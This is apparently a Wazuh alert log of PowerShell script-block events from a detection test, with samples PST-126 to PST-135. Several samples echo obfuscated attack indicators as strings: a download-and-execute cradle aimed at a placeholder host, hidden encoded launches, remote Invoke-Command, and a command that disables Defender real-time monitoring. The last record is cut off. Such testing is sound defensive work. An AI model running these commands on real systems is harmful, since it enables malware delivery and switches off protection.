{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"cfd343dc-86db-4704-bbcf-59ce61b9179d","scriptBlockText":"$sampleId='PST-126'; 'alpha','gamma','beta' | Sort-Object; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722555","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-126'; 'alpha','gamma','beta' | Sort-Object; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: cfd343dc-86db-4704-bbcf-59ce61b9179d\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:27.3870257Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:27.3870257Z\",\"eventRecordID\":\"722555\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-126'; 'alpha','gamma','beta' | Sort-Object; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: cfd343dc-86db-4704-bbcf-59ce61b9179d\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-126'; 'alpha','gamma','beta' | Sort-Object; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"cfd343dc-86db-4704-bbcf-59ce61b9179d\"}}}","id":"1784280988.479926","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:28.063+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"4f2cda98-48af-4228-88fc-3951f8145d56","scriptBlockText":"$sampleId='PST-127'; $indicator='Get-Clipboard -Raw | ConvertTo-Json -Compress'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722558","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-127'; $indicator='Get-Clipboard -Raw | ConvertTo-Json -Compress'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 4f2cda98-48af-4228-88fc-3951f8145d56\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:27.7130023Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:27.7130023Z\",\"eventRecordID\":\"722558\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-127'; $indicator='Get-Clipboard -Raw | ConvertTo-Json -Compress'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 4f2cda98-48af-4228-88fc-3951f8145d56\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-127'; $indicator='Get-Clipboard -Raw | ConvertTo-Json -Compress'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"4f2cda98-48af-4228-88fc-3951f8145d56\"}}}","id":"1784280988.483245","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell collected clipboard data","firedtimes":1,"groups":["windows"," powershell"],"id":"91824","level":4,"mail":false,"mitre":{"id":["T1115"],"tactic":["Collection"],"technique":["Clipboard Data"]}},"timestamp":"2026-07-17T11:36:28.086+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"aded2e90-2548-4e26-8901-1529258811e2","scriptBlockText":"$sampleId='PST-128'; $indicator='powershell.exe -' + 'NoProfile -Windo' + 'wStyle Hid' + 'den -EncodedComm' + 'and VwByAGkAdAB' + 'lAC0ATwB1AHQAcA' + 'B1AHQAIAAn' + 'AFQASABFAFMASQ' + 'BTAC0ASQBOAE' + 'UAUgBUACcA'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722562","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-128'; $indicator='powershell.exe -' + 'NoProfile -Windo' + 'wStyle Hid' + 'den -EncodedComm' + 'and VwByAGkAdAB' + 'lAC0ATwB1AHQAcA' + 'B1AHQAIAAn' + 'AFQASABFAFMASQ' + 'BTAC0ASQBOAE' + 'UAUgBUACcA'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: aded2e90-2548-4e26-8901-1529258811e2\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:28.0446512Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:28.0446512Z\",\"eventRecordID\":\"722562\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-128'; $indicator='powershell.exe -' + 'NoProfile -Windo' + 'wStyle Hid' + 'den -EncodedComm' + 'and VwByAGkAdAB' + 'lAC0ATwB1AHQAcA' + 'B1AHQAIAAn' + 'AFQASABFAFMASQ' + 'BTAC0ASQBOAE' + 'UAUgBUACcA'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: aded2e90-2548-4e26-8901-1529258811e2\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-128'; $indicator='powershell.exe -' + 'NoProfile -Windo' + 'wStyle Hid' + 'den -EncodedComm' + 'and VwByAGkAdAB' + 'lAC0ATwB1AHQAcA' + 'B1AHQAIAAn' + 'AFQASABFAFMASQ' + 'BTAC0ASQBOAE' + 'UAUgBUACcA'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"aded2e90-2548-4e26-8901-1529258811e2\"}}}","id":"1784280988.483245","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:28.101+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"9e74730d-0c68-4dd8-b5a8-c059e98b3353","scriptBlockText":"$sampleId='PST-129'; $SeRvErNaMe = $env:COMPUTERNAME; $AuDiTMoDe = 'ReadOnly'; Write-Output ($SeRvErNaMe + ':' + $AuDiTMoDe); Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722575","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-129'; $SeRvErNaMe = $env:COMPUTERNAME; $AuDiTMoDe = 'ReadOnly'; Write-Output ($SeRvErNaMe + ':' + $AuDiTMoDe); Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 9e74730d-0c68-4dd8-b5a8-c059e98b3353\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:28.3682314Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:28.3682314Z\",\"eventRecordID\":\"722575\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-129'; $SeRvErNaMe = $env:COMPUTERNAME; $AuDiTMoDe = 'ReadOnly'; Write-Output ($SeRvErNaMe + ':' + $AuDiTMoDe); Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 9e74730d-0c68-4dd8-b5a8-c059e98b3353\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-129'; $SeRvErNaMe = $env:COMPUTERNAME; $AuDiTMoDe = 'ReadOnly'; Write-Output ($SeRvErNaMe + ':' + $AuDiTMoDe); Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"9e74730d-0c68-4dd8-b5a8-c059e98b3353\"}}}","id":"1784280989.483245","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":15,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:36:29.148+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"fb403ee3-2273-4195-be7a-1b924c78b9db","scriptBlockText":"$sampleId='PST-130'; $indicator='$cmd=(''Inv''+''oke-Expression''); &amp; (Get-Command $cmd) \\\"Write-Output ''THESIS-INERT''\\\"'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722577","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-130'; $indicator='$cmd=(''Inv''+''oke-Expression''); & (Get-Command $cmd) \"Write-Output ''THESIS-INERT''\"'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: fb403ee3-2273-4195-be7a-1b924c78b9db\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:28.7065383Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:28.7065383Z\",\"eventRecordID\":\"722577\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-130'; $indicator='$cmd=(''Inv''+''oke-Expression''); & (Get-Command $cmd) \\\"Write-Output ''THESIS-INERT''\\\"'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: fb403ee3-2273-4195-be7a-1b924c78b9db\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-130'; $indicator='$cmd=(''Inv''+''oke-Expression''); &amp; (Get-Command $cmd) \\\\\\\"Write-Output ''THESIS-INERT''\\\\\\\"'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"fb403ee3-2273-4195-be7a-1b924c78b9db\"}}}","id":"1784280989.485493","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:29.153+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"dfc518cb-e013-43d9-b342-1dcdeb401348","scriptBlockText":"$sampleId='PST-131'; $indicator='Invoke-Command -Com' + 'puterName ''host.ex' + 'ample.invalid'' -Scrip' + 'tBlock { powershe' + 'll.exe -NoProfile -E' + 'ncodedCommand Vw' + 'ByAGkAdABlAC0AT' + 'wB1AHQAcAB1AHQAIAAn' + 'AFQASABFAFMASQBTAC0AS' + 'QBOAEUAUgBUACcA' + ' }'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722580","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-131'; $indicator='Invoke-Command -Com' + 'puterName ''host.ex' + 'ample.invalid'' -Scrip' + 'tBlock { powershe' + 'll.exe -NoProfile -E' + 'ncodedCommand Vw' + 'ByAGkAdABlAC0AT' + 'wB1AHQAcAB1AHQAIAAn' + 'AFQASABFAFMASQBTAC0AS' + 'QBOAEUAUgBUACcA' + ' }'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: dfc518cb-e013-43d9-b342-1dcdeb401348\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:29.0286188Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:29.0286188Z\",\"eventRecordID\":\"722580\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-131'; $indicator='Invoke-Command -Com' + 'puterName ''host.ex' + 'ample.invalid'' -Scrip' + 'tBlock { powershe' + 'll.exe -NoProfile -E' + 'ncodedCommand Vw' + 'ByAGkAdABlAC0AT' + 'wB1AHQAcAB1AHQAIAAn' + 'AFQASABFAFMASQBTAC0AS' + 'QBOAEUAUgBUACcA' + ' }'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: dfc518cb-e013-43d9-b342-1dcdeb401348\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-131'; $indicator='Invoke-Command -Com' + 'puterName ''host.ex' + 'ample.invalid'' -Scrip' + 'tBlock { powershe' + 'll.exe -NoProfile -E' + 'ncodedCommand Vw' + 'ByAGkAdABlAC0AT' + 'wB1AHQAcAB1AHQAIAAn' + 'AFQASABFAFMASQBTAC0AS' + 'QBOAEUAUgBUACcA' + ' }'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"dfc518cb-e013-43d9-b342-1dcdeb401348\"}}}","id":"1784280989.485493","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script used \"Invoke-command\" cmdlet to execute sub script","firedtimes":1,"groups":["windows"," powershell"],"id":"91822","level":12,"mail":true,"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}},"timestamp":"2026-07-17T11:36:29.160+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"c31a0956-50fa-4e15-8870-9b3ed693ad84","scriptBlockText":"$sampleId='PST-132'; $indicator='Set-Mp`Pr`eference -Exclusi`on`Path ''C:\\\\__THES`IS_INERT__'' -DisableReal`timeMo`nitoring $true'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722585","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-132'; $indicator='Set-Mp`Pr`eference -Exclusi`on`Path ''C:\\__THES`IS_INERT__'' -DisableReal`timeMo`nitoring $true'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: c31a0956-50fa-4e15-8870-9b3ed693ad84\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:29.3491328Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:29.3491328Z\",\"eventRecordID\":\"722585\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-132'; $indicator='Set-Mp`Pr`eference -Exclusi`on`Path ''C:\\\\__THES`IS_INERT__'' -DisableReal`timeMo`nitoring $true'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: c31a0956-50fa-4e15-8870-9b3ed693ad84\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-132'; $indicator='Set-Mp`Pr`eference -Exclusi`on`Path ''C:\\\\\\\\__THES`IS_INERT__'' -DisableReal`timeMo`nitoring $true'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"c31a0956-50fa-4e15-8870-9b3ed693ad84\"}}}","id":"1784280990.487841","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:30.206+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"94da08a0-5425-4d1b-bb7e-5d33ba6a7603","scriptBlockText":"$sampleId='PST-133'; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722587","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-133'; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 94da08a0-5425-4d1b-bb7e-5d33ba6a7603\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:29.6907502Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:29.6907502Z\",\"eventRecordID\":\"722587\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-133'; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 94da08a0-5425-4d1b-bb7e-5d33ba6a7603\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-133'; Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, FreeSpace, Size; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"94da08a0-5425-4d1b-bb7e-5d33ba6a7603\"}}}","id":"1784280990.487841","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:30.211+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f9895679-6c96-4db0-9fdd-b5b48bec41a3","scriptBlockText":"$sampleId='PST-134'; $indicator='IEX (New-Ob`ject Net.Web`Client).Downl`oadSt`ring(''https://stage.example.invalid/bootst`rap.ps1'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722591","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-134'; $indicator='IEX (New-Ob`ject Net.Web`Client).Downl`oadSt`ring(''https://stage.example.invalid/bootst`rap.ps1'')'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f9895679-6c96-4db0-9fdd-b5b48bec41a3\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:30.0517718Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:30.0517718Z\",\"eventRecordID\":\"722591\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-134'; $indicator='IEX (New-Ob`ject Net.Web`Client).Downl`oadSt`ring(''https://stage.example.invalid/bootst`rap.ps1'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f9895679-6c96-4db0-9fdd-b5b48bec41a3\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-134'; $indicator='IEX (New-Ob`ject Net.Web`Client).Downl`oadSt`ring(''https://stage.example.invalid/bootst`rap.ps1'')'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f9895679-6c96-4db0-9fdd-b5b48bec41a3\"}}}","id":"1784280990.490889","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","firedtimes":3,"groups":["windows"," powershell"],"id":"91837","level":4,"mail":false,"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}},"timestamp":"2026-07-17T11:36:30.219+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"370f0418-1718-481c-af00-0fd81570b99e","scriptBlockText":"$sampleId='PST-135'; $uri = 'https://intranet.example.local/status/api/v1/health?format=json'; Write-Output $uri; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722606","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-135'; $uri = 'https://intranet.example.local/status/api/v1/health?format=json'; Write-Output $uri; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 370f0418-1718-481c-af00-0fd81570b99e\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:30.3944007Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:30.3944007Z\",\"eventRecordID\":\"722606\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-135'; $uri = 'https://intranet.example.local/status/api/v1/health?format=json'; Write-Output $uri; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 370f0418-1718-481c-af00-0fd81570b99e\\r\\nPath: 